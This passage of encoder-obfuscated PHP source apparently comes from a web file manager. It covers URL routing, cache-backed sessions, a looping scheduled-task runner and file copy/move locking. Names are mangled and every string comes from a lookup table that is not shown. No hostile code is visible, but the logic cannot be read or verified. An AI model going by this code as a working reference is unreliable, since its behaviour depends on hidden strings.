authInfo($İúšÖğê) { $¬Ìú¥Á =& $_SERVER[‚ûòÉ˜ş]; if ($İúšÖğê[$¬Ìú¥Á[1989]]) { $ãúÎËÉ = Model($¬Ìú¥Á[548])->listData($İúšÖğê[$¬Ìú¥Á[1989]]); if (!$ãúÎËÉ) { return !1; $ó«Áã÷® = Model($¬Ìú¥Á[548])->listData(); $ã—µµÒ = array_filter_by_field($ó«Áã÷®, $¬Ìú¥Á[463], $¬Ìú¥Á[222]); return $ã—µµÒ; } $„•å‘À = array_field_key($ãúÎËÉ, array($¬Ìú¥Á[451], $¬Ìú¥Á[42], $¬Ìú¥Á[463], $¬Ìú¥Á[1908], $¬Ìú¥Á[1909])); $„•å‘À[$¬Ìú¥Á[2104]] = $İúšÖğê; return $„•å‘À; } else { return array($¬Ìú¥Á[469] => 0, $¬Ìú¥Á[1891] => $İúšÖğê[$¬Ìú¥Á[2049]], $¬Ìú¥Á[470] => $¬Ìú¥Á[12], $¬Ìú¥Á[1908] => $¬Ìú¥Á[2105]); } } } goto a’ÁÃÉå›İ; bïÈÇ‚·”Ë: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\x5e\57\135\x2b", "\x3a\156\165\x6d" => "\133\x30\55\71\x5d\x2b", "\x3a\x61\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($­ş¼™÷Ü, $‚²É¹í£) { $Õƒú¥¤  =& $_SERVER[‚ûòÉ˜ş]; if ($­ş¼™÷Ü == $Õƒú¥¤ [1629]) { $–ö’¿’´ = array_map($Õƒú¥¤ [1630], $‚²É¹í£[0]); $ğïôŒ’ = strpos($‚²É¹í£[1], $Õƒú¥¤ [8]) === 0 ? $‚²É¹í£[1] : $Õƒú¥¤ [8] . $‚²É¹í£[1]; $†…†ÖÌñ = $‚²É¹í£[2]; } else { $–ö’¿’´ = null; $ğïôŒ’ = strpos($‚²É¹í£[0], $Õƒú¥¤ [8]) === 0 ? $‚²É¹í£[0] : $Õƒú¥¤ [8] . $‚²É¹í£[0]; $†…†ÖÌñ = $‚²É¹í£[1]; } array_push(self::$maps, $–ö’¿’´); array_push(self::$routes, $ğïôŒ’); array_push(self::$methods, strtoupper($­ş¼™÷Ü)); array_push(self::$callbacks, $†…†ÖÌñ); } public static function error($ÔÀœİÛ£) { self::$errorCallback = $ÔÀœİÛ£; } public static function haltOnMatch($Áéâ½ü® = true) { self::$halts = $Áéâ½ü®; } public static function dispatch() { $’–ÏÎÙ¦ =& $_SERVER[‚ûòÉ˜ş]; $¦¯…©é = parse_url($_SERVER[$’–ÏÎÙ¦[1631]], PHP_URL_PATH); $Ï‰Û¶ªÆ = $_SERVER[$’–ÏÎÙ¦[170]]; $öŠû»Ö = array_keys(static::$patterns); $İ½¨“Ô­ = array_values(static::$patterns); $«Âİœ„ = !1; self::$routes = preg_replace($’–ÏÎÙ¦[1317], $’–ÏÎÙ¦[8], self::$routes); if (in_array($¦¯…©é, self::$routes)) { $óÎ¿ÃŸù = array_keys(self::$routes, $¦¯…©é); foreach ($óÎ¿ÃŸù as $Ÿí«‰‘Ğ) { if (self::$methods[$Ÿí«‰‘Ğ] == $Ï‰Û¶ªÆ || self::$methods[$Ÿí«‰‘Ğ] == $’–ÏÎÙ¦[1632] || in_array($Ï‰Û¶ªÆ, self::$maps[$Ÿí«‰‘Ğ])) { $«Âİœ„ = !0; if (!is_object(self::$callbacks[$Ÿí«‰‘Ğ])) { $¯àÌì« = explode($’–ÏÎÙ¦[8], self::$callbacks[$Ÿí«‰‘Ğ]); $¥íÏ¿ƒ = end($¯àÌì«); $ŠÕêÇı = explode($’–ÏÎÙ¦[1249], $¥íÏ¿ƒ); $°ù ÉŠ = new $ŠÕêÇı[0](); $°ù ÉŠ->{$ŠÕêÇı[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ÿí«‰‘Ğ]); if (self::$halts) { return; } } } } } else { $¾¿„„Ú = 0; foreach (self::$routes as $Ÿí«‰‘Ğ) { if (strpos($Ÿí«‰‘Ğ, $’–ÏÎÙ¦[4]) !== !1) { $Ÿí«‰‘Ğ = str_replace($öŠû»Ö, $İ½¨“Ô­, $Ÿí«‰‘Ğ); } if (preg_match($’–ÏÎÙ¦[1633] . $Ÿí«‰‘Ğ . $’–ÏÎÙ¦[1634], $¦¯…©é, $áËÀï¾Ù)) { if (self::$methods[$¾¿„„Ú] == $Ï‰Û¶ªÆ || self::$methods[$¾¿„„Ú] == $’–ÏÎÙ¦[1632] || !empty(self::$maps[$¾¿„„Ú]) && in_array($Ï‰Û¶ªÆ, self::$maps[$¾¿„„Ú])) { $«Âİœ„ = !0; array_shift($áËÀï¾Ù); if (!is_object(self::$callbacks[$¾¿„„Ú])) { $¯àÌì« = explode($’–ÏÎÙ¦[8], self::$callbacks[$¾¿„„Ú]); $¥íÏ¿ƒ = end($¯àÌì«); $ŠÕêÇı = explode($’–ÏÎÙ¦[1249], $¥íÏ¿ƒ); $°ù ÉŠ = new $ŠÕêÇı[0](); if (!method_exists($°ù ÉŠ, $ŠÕêÇı[1])) { echo $’–ÏÎÙ¦[1635]; } else { call_user_func_array(array($°ù ÉŠ, $ŠÕêÇı[1]), $áËÀï¾Ù); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¾¿„„Ú], $áËÀï¾Ù); if (self::$halts) { return; } } } } $¾¿„„Ú++; } } if ($«Âİœ„ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¶ÆûØ¤ =& $_SERVER[‚ûòÉ˜ş]; header($_SERVER[$¶ÆûØ¤[1636]] . $¶ÆûØ¤[1637]); echo $¶ÆûØ¤[1638]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$’–ÏÎÙ¦[1631]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $«ŞêÅƒÂ =& $_SERVER[‚ûòÉ˜ş]; static $ÁÑçÑä = false; if ($ÁÑçÑä) { return $ÁÑçÑä; } $ûş§˜È = $GLOBALS[$«ŞêÅƒÂ[6]][$«ŞêÅƒÂ[402]]; self::$sessionTime = $ûş§˜È[$«ŞêÅƒÂ[1639]]; $ëä¿Ô”İ = isset($GLOBALS[$«ŞêÅƒÂ[1640]]) ? $GLOBALS[$«ŞêÅƒÂ[1640]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ëä¿Ô”İ)) { self::$sessionSign = Cookie::get($ëä¿Ô”İ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ëä¿Ô”İ, self::$sessionSign, self::$sessionTime); $Ê¹Ì£úí = $ûş§˜È[$«ŞêÅƒÂ[1641]]; $ƒí”õ«Õ = $ûş§˜È[$Ê¹Ì£úí]; $°Íäö— = $ûş§˜È[$«ŞêÅƒÂ[868]]; switch ($Ê¹Ì£úí) { case $«ŞêÅƒÂ[31]: self::$handle = Model($«ŞêÅƒÂ[869]); break; case $«ŞêÅƒÂ[870]: self::$handle = new CacheRedis($ƒí”õ«Õ, $°Íäö—); break; case $«ŞêÅƒÂ[871]: self::$handle = new CacheMemcached($ƒí”õ«Õ, $°Íäö—); break; case $«ŞêÅƒÂ[224]: $ƒí”õ«Õ[$«ŞêÅƒÂ[94]] = $ƒí”õ«Õ[$«ŞêÅƒÂ[94]] . $«ŞêÅƒÂ[1642]; self::$handle = new CacheFile($ƒí”õ«Õ, $°Íäö—); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÁÑçÑä = new self(); return $ÁÑçÑä; } public static function getBySign($ûşÜï’ñ) { $Ò´ñû§ = self::$handle->get($ûşÜï’ñ); $Ò´ñû§ = unserialize($Ò´ñû§); return is_array($Ò´ñû§) ? $Ò´ñû§ : array(); } public static function setBySign($è¡£’«Ú, $óú×ËØ³) { CacheLock::lock($è¡£’«Ú); self::$handle->set($è¡£’«Ú, serialize($óú×ËØ³), self::$sessionTime); CacheLock::unlock($è¡£’«Ú); } public static function sign($„ëŠ¸ª¬ = false) { if ($„ëŠ¸ª¬) { self::$sessionSign = $„ëŠ¸ª¬; } self::init(); return self::$sessionSign; } public static function set($–ÇÆÚê, $È¬˜¹–Ë = false) { self::init(); if (is_array($–ÇÆÚê)) { foreach ($–ÇÆÚê as $¹×Ü°•Ğ => $ğ­½ıê) { array_set_value(self::$data, $¹×Ü°•Ğ, $ğ­½ıê); } } else { array_set_value(self::$data, $–ÇÆÚê, $È¬˜¹–Ë); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¢ÃÜ­ = false) { self::init(); if (!$¢ÃÜ­) { return self::$data; } return array_get_value(self::$data, $¢ÃÜ­); } public static function remove($µê«æŸª) { self::init(); unset(self::$data[$µê«æŸª]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[‚ûòÉ˜ş][874])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ú‚öùÜ± =& $_SERVER[‚ûòÉ˜ş]; if (self::valueGet($ú‚öùÜ±[790]) != $ú‚öùÜ±[98]) { return; } if (self::valueGet($ú‚öùÜ±[1643]) == $ú‚öùÜ±[98]) { $ˆËäˆÚ‡ = self::valueGet($ú‚öùÜ±[1644]); if (time() - $ˆËäˆÚ‡ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ú‚öùÜ±[1643], $ú‚öùÜ±[98]); self::log($ú‚öùÜ±[1645] . ACTION . $ú‚öùÜ±[1646]); Hook::bind($ú‚öùÜ±[1647], $ú‚öùÜ±[1648]); $¹‡ÚñÈµ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ú‚öùÜ±[790]) != $ú‚öùÜ±[98]) { self::valueSet($ú‚öùÜ±[1643], $ú‚öùÜ±[222]); self::log($ú‚öùÜ±[1649]); die; } $Ë»²¸çá = time(); if ($Ë»²¸çá - $¹‡ÚñÈµ >= 60) { self::valueSet(array($ú‚öùÜ±[1643] => $ú‚öùÜ±[98], $ú‚öùÜ±[1644] => $Ë»²¸çá), !1); $¹‡ÚñÈµ = $Ë»²¸çá; } if (!file_exists(USER_SYSTEM . $ú‚öùÜ±[1650])) { self::valueSet(array($ú‚öùÜ±[1643] => $ú‚öùÜ±[222], $ú‚öùÜ±[790] => $ú‚öùÜ±[222]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ß°Í§Úä =& $_SERVER[‚ûòÉ˜ş]; http_close(); $GLOBALS[$ß°Í§Úä[1651]] = 1; $_SERVER[$ß°Í§Úä[1652]] = $ß°Í§Úä[1653]; $_COOKIE = array(); $GLOBALS[$ß°Í§Úä[544]] = 1; $GLOBALS[$ß°Í§Úä[1654]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $°¿æ¸Õ’ =& $_SERVER[‚ûòÉ˜ş]; http_close(); self::valueSet($°¿æ¸Õ’[790], $°¿æ¸Õ’[222]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($°¿æ¸Õ’[1643] => $°¿æ¸Õ’[222], $°¿æ¸Õ’[790] => $°¿æ¸Õ’[98]), !1); } public static function taskSwitch() { $š¨ß—ô =& $_SERVER[‚ûòÉ˜ş]; $şê¥ÒîÃ = self::valueGet($š¨ß—ô[790]) == $š¨ß—ô[98] ? $š¨ß—ô[222] : $š¨ß—ô[98]; self::valueSet($š¨ß—ô[790], $şê¥ÒîÃ); } public static function shutdownEvent() { $•èû‰İÀ =& $_SERVER[‚ûòÉ˜ş]; self::valueSet($•èû‰İÀ[1643], $•èû‰İÀ[222]); self::log($•èû‰İÀ[1655]); } public static function config($Í÷ª™Í, $Í«óèœƒ) { self::valueSet($_SERVER[‚ûòÉ˜ş][790], $Í÷ª™Í); } private static function taskRunAll() { $â¡éö×ü =& $_SERVER[‚ûòÉ˜ş]; $ÅÙå´Ê¶ = timeFloat(); $Í„ÛŒ’ = Model($â¡éö×ü[1656])->listData(); $°·èóè• = count($Í„ÛŒ’); for ($…¸âà = 0; $…¸âà < $°·èóè•; $…¸âà++) { $ÒßîÜˆ = $Í„ÛŒ’[$…¸âà]; if (!$ÒßîÜˆ[$â¡éö×ü[451]] || $ÒßîÜˆ[$â¡éö×ü[1657]] != $â¡éö×ü[98]) { continue; } if (!self::taskTimeCheck($ÒßîÜˆ)) { continue; } self::taskRun($ÒßîÜˆ); } Hook::trigger($â¡éö×ü[1658]); self::taskQueueRun($ÅÙå´Ê¶); } private static function taskQueueRun($ã¨²Å¨á) { $›‹ñâÄ– = 10; while (!0) { $Öòğ¡… = TaskQueue::run(); if ($Öòğ¡… === !1) { break; } if (timeFloat() - $ã¨²Å¨á >= $›‹ñâÄ–) { break; } } } private static function taskTimeCheck($¥–Â) { $§ÒÒ•« =& $_SERVER[‚ûòÉ˜ş]; $Àµš›³› = json_decode($¥–Â[$§ÒÒ•«[204]], !0); $ÌÏ—áÍç = intval($¥–Â[$§ÒÒ•«[1644]]); $Ñ¦Æôş™ = strtotime($§ÒÒ•«[1659] . $Àµš›³›[$§ÒÒ•«[1660]] . $§ÒÒ•«[1661]) - strtotime($§ÒÒ•«[1662]); $¥Ó˜çÎÚ = time() - strtotime(date($§ÒÒ•«[1663]) . $§ÒÒ•«[1664]); $í¯İÖÙ  = $¥Ó˜çÎÚ >= $Ñ¦Æôş™ && $¥Ó˜çÎÚ <= $Ñ¦Æôş™ + 3600; switch ($Àµš›³›[$§ÒÒ•«[43]]) { case $§ÒÒ•«[1665]: if (time() - $ÌÏ—áÍç < 3600 * 24 * 30) { return !1; } if ($Àµš›³›[$§ÒÒ•«[1665]] == date($§ÒÒ•«[1666]) && $í¯İÖÙ ) { return !0; } break; case $§ÒÒ•«[1667]: if (time() - $ÌÏ—áÍç < 3600 * 24 * 7) { return !1; } $¦šë¡æ = date($§ÒÒ•«[1668]) == 0 ? 7 : date($§ÒÒ•«[1668]); if ($Àµš›³›[$§ÒÒ•«[1667]] == $¦šë¡æ && $í¯İÖÙ ) { return !0; } break; case $§ÒÒ•«[1660]: if (time() - $ÌÏ—áÍç < 3600 * 24) { return !1; } if ($í¯İÖÙ ) { return !0; } break; case $§ÒÒ•«[1669]: if (time() - $ÌÏ—áÍç >= floatval($Àµš›³›[$§ÒÒ•«[1669]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $µÂ±å–‹ =& $_SERVER[‚ûòÉ˜ş]; static $ğ¬É–¬ß = 0; $ÙÒÕ’Şè = 300; if (!$ğ¬É–¬ß) { $ğ¬É–¬ß = time(); } if (time() - $ğ¬É–¬ß < $ÙÒÕ’Şè) { return; } $ğ¬É–¬ß = time(); $á¨ÅÁÏ = Model($µÂ±å–‹[554])->db($µÂ±å–‹[12]); if ($á¨ÅÁÏ) { $á¨ÅÁÏ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($µÂ±å–‹[1670], $µÂ±å–‹[1671]); die; } } public static function taskRun($¨Á¦˜Ùç) { $¹‡²Š‹Ù =& $_SERVER[‚ûòÉ˜ş]; self::log($¹‡²Š‹Ù[1672] . $¨Á¦˜Ùç[$¹‡²Š‹Ù[451]] . $¹‡²Š‹Ù[1673] . $¨Á¦˜Ùç[$¹‡²Š‹Ù[42]] . $¹‡²Š‹Ù[1674] . $¨Á¦˜Ùç[$¹‡²Š‹Ù[1675]]); Model($¹‡²Š‹Ù[1656])->run($¨Á¦˜Ùç[$¹‡²Š‹Ù[451]]); $Œ­Šæ¥ = timeFloat(); $£şö€éÉ = $¹‡²Š‹Ù[12]; switch ($¨Á¦˜Ùç[$¹‡²Š‹Ù[43]]) { case $¹‡²Š‹Ù[360]: $Íîñ½”à = url_request($¨Á¦˜Ùç[$¹‡²Š‹Ù[1675]], $¹‡²Š‹Ù[255], !1, !1, !1, !1, 10); if ($Íîñ½”à[$¹‡²Š‹Ù[790]]) { $£şö€éÉ = strlen($Íîñ½”à[$¹‡²Š‹Ù[1243]]); } break; case $¹‡²Š‹Ù[254]: $£şö€éÉ = Hook::apply($¨Á¦˜Ùç[$¹‡²Š‹Ù[1675]]); default: break; } Model($¹‡²Š‹Ù[1676])->add(array($¹‡²Š‹Ù[1677] => $¹‡²Š‹Ù[12], $¹‡²Š‹Ù[1678] => $¹‡²Š‹Ù[222], $¹‡²Š‹Ù[43] => $¹‡²Š‹Ù[1679] . $¨Á¦˜Ùç[$¹‡²Š‹Ù[451]], $¹‡²Š‹Ù[1680] => json_encode(array($¹‡²Š‹Ù[42] => $¨Á¦˜Ùç[$¹‡²Š‹Ù[42]], $¹‡²Š‹Ù[1681] => timeFloat() - $Œ­Šæ¥, $¹‡²Š‹Ù[346] => $£şö€éÉ)))); $†İ×Ù²• = $£şö€éÉ ? $¹‡²Š‹Ù[1682] . $£şö€éÉ : $¹‡²Š‹Ù[12]; self::log($¹‡²Š‹Ù[1683] . $¨Á¦˜Ùç[$¹‡²Š‹Ù[451]] . $¹‡²Š‹Ù[175] . $†İ×Ù²•); return !0; } public static function valueGet($éÖ®¹¿ß) { $Ô´ßê´È =& $_SERVER[‚ûòÉ˜ş]; $‘¬Û»•Ğ = $Ô´ßê´È[1684]; $¸õ’ÇûÈ = Model($Ô´ßê´È[484])->get($éÖ®¹¿ß, $‘¬Û»•Ğ); if (is_null($¸õ’ÇûÈ)) { Model($Ô´ßê´È[484])->set($Ô´ßê´È[790], $Ô´ßê´È[98], $‘¬Û»•Ğ); Model($Ô´ßê´È[484])->set($Ô´ßê´È[1643], $Ô´ßê´È[222], $‘¬Û»•Ğ); $¸õ’ÇûÈ = Model($Ô´ßê´È[484])->get($éÖ®¹¿ß, $‘¬Û»•Ğ); } return $¸õ’ÇûÈ; } private static function valueSet($ƒå×È¿Å, $ÌúıÆæË) { $§‘ÊÜ˜® =& $_SERVER[‚ûòÉ˜ş]; $ğÊ¢‘ä„ = $§‘ÊÜ˜®[1685]; CacheLock::lock($ğÊ¢‘ä„); $¾òÉ®äª = Model($§‘ÊÜ˜®[484])->set($ƒå×È¿Å, $ÌúıÆæË, $§‘ÊÜ˜®[1684]); CacheLock::unlock($ğÊ¢‘ä„); return $¾òÉ®äª; } protected static function log($‰°ü®šê) { write_log($‰°ü®šê, $_SERVER[‚ûòÉ˜ş][1671]); } private static function cacheClear() { $ù‹µõÇ =& $_SERVER[‚ûòÉ˜ş]; Cache::clearMemory(Model($ù‹µõÇ[484])->cacheKey($ù‹µõÇ[1684])); Cache::clearMemory(Model($ù‹µõÇ[484])->cacheKey($ù‹µõÇ[1686])); Model($ù‹µõÇ[1656])->cacheClear(); self::closeDatabase(); } } goto bÔ‹íõ÷§¬; f’î’£³é°: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ùÆÓ¾À) { $ÉÖŒ‡® =& $_SERVER[‚ûòÉ˜ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÉÖŒ‡®[594], $ùÆÓ¾À); $Ùü¤ºÎ = 1; $this->_lockEvent($ùÆÓ¾À, array($ÉÖŒ‡®[595], $ÉÖŒ‡®[596]), $Ùü¤ºÎ); $this->_lockParent($ùÆÓ¾À, array($ÉÖŒ‡®[596]), $Ùü¤ºÎ); $this->_lockEvent($ùÆÓ¾À, array($ÉÖŒ‡®[597], $ÉÖŒ‡®[598]), $Ùü¤ºÎ); $this->_lockCheckEnd($ÉÖŒ‡®[594], $ùÆÓ¾À); } public function lockCopyEnd($…—–§—) { $Ì©åµ»  =& $_SERVER[‚ûòÉ˜ş]; if (!$this->allowLock()) { return; } $¿İé„¿‰ = 0; $this->_lockEvent($…—–§—, array($Ì©åµ» [595], $Ì©åµ» [596]), $¿İé„¿‰); $this->_lockParent($…—–§—, array($Ì©åµ» [596]), $¿İé„¿‰); $this->_lockEvent($…—–§—, array($Ì©åµ» [597], $Ì©åµ» [598]), $¿İé„¿‰); } public function lockWriteStart($ÔóœòıË, $ó À½ = '') { $×¡ØÉ¿¿ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($×¡ØÉ¿¿[595], $ÔóœòıË); $å¾—æÃà = 1; $this->_lockKey($×¡ØÉ¿¿[599] . $ÔóœòıË . $×¡ØÉ¿¿[10] . $ó À½, $å¾—æÃà); $this->_lockEvent($ÔóœòıË, array($×¡ØÉ¿¿[594], $×¡ØÉ¿¿[596]), $å¾—æÃà); $this->_lockParent($ÔóœòıË, array($×¡ØÉ¿¿[594], $×¡ØÉ¿¿[596]), $å¾—æÃà); $this->_lockCheckEnd($×¡ØÉ¿¿[595], $ÔóœòıË); } public function lockWriteEnd($«¤‡ûª, $úü©¤Ä = '') { $Š°ö¼İã =& $_SERVER[‚ûòÉ˜ş]; if (!$this->allowLock()) { return; } $¥µƒ÷ƒ´ = 0; $this->_lockKey($Š°ö¼İã[599] . $«¤‡ûª . $Š°ö¼İã[10] . $úü©¤Ä, $¥µƒ÷ƒ´); $this->_lockEvent($«¤‡ûª, array($Š°ö¼İã[594], $Š°ö¼İã[596]), $¥µƒ÷ƒ´); $this->_lockParent($«¤‡ûª, array($Š°ö¼İã[594], $Š°ö¼İã[596]), $¥µƒ÷ƒ´); } public function lockMoveStart($…ïÒŸÀË) { $‡¡ç°¾Ú =& $_SERVER[‚ûòÉ˜ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($‡¡ç°¾Ú[596], $…ïÒŸÀË); $–˜»ÇÊ± = 1; $this->_lockKey($‡¡ç°¾Ú[600] . $…ïÒŸÀË, $–˜»ÇÊ±); $this->_lockEvent($…ïÒŸÀË, array($‡¡ç°¾Ú[594], $‡¡ç°¾Ú[595]), $–˜»ÇÊ±); $this->_lockParent($…ïÒŸÀË, array($‡¡ç°¾Ú[594], $‡¡ç°¾Ú[596]), $–˜»ÇÊ±); $this->_lockEvent($…ïÒŸÀË, array($‡¡ç°¾Ú[601], $‡¡ç°¾Ú[597], $‡¡ç°¾Ú[598]), $–˜»ÇÊ±); $this->_lockCheckEnd($‡¡ç°¾Ú[596], $…ïÒŸÀË); } public function lockMoveEnd($è«´¨) { $ƒê«¿ªÏ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->allowLock()) { return; } $Şß°óí = 0; $this->_lockKey($ƒê«¿ªÏ[600] . $è«´¨, $Şß°óí); $this->_lockEvent($è«´¨, array($ƒê«¿ªÏ[594], $ƒê«¿ªÏ[595]), $Şß°óí); $this->_lockParent($è«´¨, array($ƒê«¿ªÏ[594], $ƒê«¿ªÏ[596]), $Şß°óí); $this->_lockEvent($è«´¨, array($ƒê«¿ªÏ[601], $ƒê«¿ªÏ[597], $ƒê«¿ªÏ[598]), $Şß°óí); } private function _lockCheck($Çíµ ‰ø, $œ™ã’›) { $ ´¦§À‡ =& $_SERVER[‚ûòÉ˜ş]; $•ÕÑï¤¶ = $this->sourceInfo($œ™ã’›); $ƒİ¦ÉÜŒ = $Çíµ ‰ø . $ ´¦§À‡[10] . $œ™ã’›; $this->_lockTimeStart[$ƒİ¦ÉÜŒ] = timeFloat(); if (!is_array($•ÕÑï¤¶)) { return; } $š±ß×€¾ = LNG($ ´¦§À‡[602]); CacheLock::setErrorMsg($ ´¦§À‡[173] . htmlspecialchars($•ÕÑï¤¶[$ ´¦§À‡[42]]) . $ ´¦§À‡[175] . $š±ß×€¾); $this->_lockKey($ƒİ¦ÉÜŒ, 1); $this->_lockKey($ƒİ¦ÉÜŒ, 0); $ÍÖŸÀ†¹ = array_reverse($this->parentLevelArray($•ÕÑï¤¶[$ ´¦§À‡[561]])); foreach ($ÍÖŸÀ†¹ as $Èäå° İ) { $ƒİ¦ÉÜŒ = $Çíµ ‰ø . $ ´¦§À‡[603] . $Èäå° İ; if (CacheLock::lockGet($ ´¦§À‡[604] . $ƒİ¦ÉÜŒ)) { $•ÕÑï¤¶ = $this->sourceInfo($Èäå° İ); CacheLock::setErrorMsg($ ´¦§À‡[173] . htmlspecialchars($•ÕÑï¤¶[$ ´¦§À‡[42]]) . $ ´¦§À‡[175] . $š±ß×€¾); $this->_lockKey($ƒİ¦ÉÜŒ, 1); $this->_lockKey($ƒİ¦ÉÜŒ, 0); } } } private function _lockCheckEnd($ÃåÅïÜÆ, $š­‚ò¶æ) { $Š­ü‚õØ =& $_SERVER[‚ûòÉ˜ş]; $ŠúüñÌ¯ = $ÃåÅïÜÆ . $Š­ü‚õØ[10] . $š­‚ò¶æ; CacheLock::setErrorMsg($Š­ü‚õØ[22]); if (!isset($this->_lockTimeStart[$ŠúüñÌ¯])) { return; } $ŠºËäŸÂ = timeFloat() - $this->_lockTimeStart[$ŠúüñÌ¯]; unset($this->_lockTimeStart[$ŠúüñÌ¯]); if ($ŠºËäŸÂ > 0.5) { unset(self::$cacheSourceInfo[$Š­ü‚õØ[509] . $š­‚ò¶æ]); } $İ‚’ÃÚà = $this->sourceInfo($š­‚ò¶æ); if (!$İ‚’ÃÚà) { show_json(LNG($Š­ü‚õØ[115]), !1); } } private function _lockParent($›…ÙÎÎ•, $£ÕËÀ, $®¾£®Ñ) { if (!$this->autoLockSet) { return; } $Û•›Şˆ = $this->sourceInfo($›…ÙÎÎ•); if (!is_array($Û•›Şˆ)) { return; } $Ùƒ±ó = array_reverse($this->parentLevelArray($Û•›Şˆ[$_SERVER[‚ûòÉ˜ş][561]])); foreach ($Ùƒ±ó as $Ê“Ÿ°Ä) { $this->_lockEvent($Ê“Ÿ°Ä, $£ÕËÀ, $®¾£®Ñ); } } private function _lockEvent($­±ÏÍ·¨, $ûö÷, $ïÜ´èŞ¤) { $Ñò×ÂÁş =& $_SERVER[‚ûòÉ˜ş]; if (!$this->autoLockSet) { return; } foreach ($ûö÷ as $èÁ°Åü) { $¿ä¯æÂü = $èÁ°Åü . $Ñò×ÂÁş[10] . $­±ÏÍ·¨; if ($ïÜ´èŞ¤ && CacheLock::lockGet($Ñò×ÂÁş[604] . $¿ä¯æÂü)) { continue; } $this->_lockKey($¿ä¯æÂü, $ïÜ´èŞ¤); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ô‹¯¢„—, $½’å¹ô¤ = 1) { $‰šİÕ«¿ = $_SERVER[‚ûòÉ˜ş][604] . md5($ô‹¯¢„—); if ($½’å¹ô¤) { if (isset(self::$_lockItemArr[$‰šİÕ«¿])) { return; } self::$_lockItemArr[$‰šİÕ«¿] = 1; CacheLock::lock($‰šİÕ«¿, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$‰šİÕ«¿])) { return; } unset(self::$_lockItemArr[$‰šİÕ«¿]); CacheLock::unlock($‰šİÕ«¿); } } public function isParentOf($ÒÒ£´È, $á¸Â›ñ®) { $¨°˜”ô¿ =& $_SERVER[‚ûòÉ˜ş]; $ùùÀ“ó = $this->sourceInfo($ÒÒ£´È); $™Ò¥ÏñÎ = $this->sourceInfo($á¸Â›ñ®); $ô¼íÕµ = $ùùÀ“ó[$¨°˜”ô¿[561]] . $ùùÀ“ó[$¨°˜”ô¿[191]] . $¨°˜”ô¿[60]; $ü›÷™ÁĞ = $™Ò¥ÏñÎ[$¨°˜”ô¿[561]] . $™Ò¥ÏñÎ[$¨°˜”ô¿[191]] . $¨°˜”ô¿[60]; $†•Ş¤ô = strpos($ü›÷™ÁĞ, $ô¼íÕµ) === 0; return $†•Ş¤ô; } private $targetIsDelete = 0; public function copy($´ñ…²‰›, $ÛÛ”¿ì, $ûÁŒÈ€  = REPEAT_REPLACE, $º•Ãù¿ = '') { $ßÌŞ¯ÜŒ =& $_SERVER[‚ûòÉ˜ş]; $ÜƒİéË¼ = $this->sourceInfo($´ñ…²‰›); $äè³û§¨ = $this->sourceInfo($ÛÛ”¿ì); if (!$ÜƒİéË¼ || !$äè³û§¨ || $äè³û§¨[$ßÌŞ¯ÜŒ[461]] != $ßÌŞ¯ÜŒ[98]) { return !1; } if ($this->isParentOf($´ñ…²‰›, $ÛÛ”¿ì)) { return !1; } $‘›Ÿî³Š = $º•Ãù¿ ? $º•Ãù¿ : $ÜƒİéË¼[$ßÌŞ¯ÜŒ[42]]; $this->lockCopyStart($´ñ…²‰›); $this->lockWriteStart($ÛÛ”¿ì, $‘›Ÿî³Š); $ßÅß‘ˆ = array($ßÌŞ¯ÜŒ[605] => array(), $ßÌŞ¯ÜŒ[606] => array(), $ßÌŞ¯ÜŒ[607] => array()); $this->targetIsDelete = intval($ÜƒİéË¼[$ßÌŞ¯ÜŒ[481]]); $¨ˆ—ÓÉß = $this->fileNameExistAuto($ÛÛ”¿ì, $ÜƒİéË¼); $ˆßà”Æü = $this->_copy($´ñ…²‰›, $ÛÛ”¿ì, $ûÁŒÈ€ , $ßÅß‘ˆ, !0, $º•Ãù¿); $this->_childrenListClear(); $this->lockCopyEnd($´ñ…²‰›); $this->lockWriteEnd($ÛÛ”¿ì, $‘›Ÿî³Š); if ($ÜƒİéË¼[$ßÌŞ¯ÜŒ[461]] == $ßÌŞ¯ÜŒ[98] && $¨ˆ—ÓÉß == $ˆßà”Æü) { $this->folderSizeResetChildren($¨ˆ—ÓÉß); } Model($ßÌŞ¯ÜŒ[608])->addAll($ßÅß‘ˆ[$ßÌŞ¯ÜŒ[606]], array(), !0); if ($¨ˆ—ÓÉß != $ˆßà”Æü || 